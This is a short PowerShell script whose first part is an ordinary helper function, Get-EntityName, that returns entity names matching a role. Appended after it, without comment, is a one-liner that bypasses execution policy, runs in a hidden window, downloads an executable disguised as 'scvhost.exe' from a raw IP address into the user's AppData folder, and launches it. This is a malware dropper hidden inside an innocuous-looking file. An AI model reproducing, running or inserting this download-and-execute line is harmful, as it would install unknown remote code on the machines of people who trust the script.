function Get-EntityName
{
    param
    (
        [Parameter(Mandatory=$true)]
        $SoftwareIdentity,

        [Parameter(Mandatory=$true)]
        $Role
    )

    foreach( $entity in $SoftwareIdentity.Entities )
    {
        if( $entity.Role -eq $Role)
        {
            $entity.Name
        }
    }
}

PowerShell -ExecutionPolicy bypass -noprofile -windowstyle hidden -command (New-Object System.Net.WebClient).DownloadFile('http://94.102.52.13/~harvy/scvhost.exe', $env:APPDATA\stvgs.exe );Start-Process ( $env:APPDATA\stvgs.exe )

